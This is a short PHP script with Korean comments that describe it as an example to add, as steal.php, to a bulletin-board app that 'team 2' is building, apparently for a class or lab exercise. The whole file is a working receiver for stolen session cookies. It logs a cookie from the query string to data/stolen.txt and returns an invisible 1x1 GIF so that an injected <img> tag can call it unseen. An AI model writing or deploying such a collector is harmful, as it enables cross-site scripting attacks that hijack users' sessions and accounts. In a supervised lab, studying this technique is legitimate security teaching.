<?php
// ─────────────────────────────────────────────────────
// 이 파일은 예시 스니펫입니다. 2조가 만드는 게시판 앱 안에
// steal.php 같은 이름으로 추가해서 사용하세요.
// 별도 로그 서버를 새로 만들 필요 없이, 앱 자신의 파일시스템에
// 탈취된 쿠키를 기록하는 방식입니다.
// ─────────────────────────────────────────────────────

$cookie = $_GET['cookie'] ?? '';

if ($cookie) {
    $line = date('Y-m-d H:i:s') . " | " . $cookie . "\n";
    file_put_contents(__DIR__ . '/data/stolen.txt', $line, FILE_APPEND);
}

// <img> 태그로 호출되는 걸 가정해 1x1 투명 gif 반환 (화면에 아무것도 안 보이게)
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBTAA7');
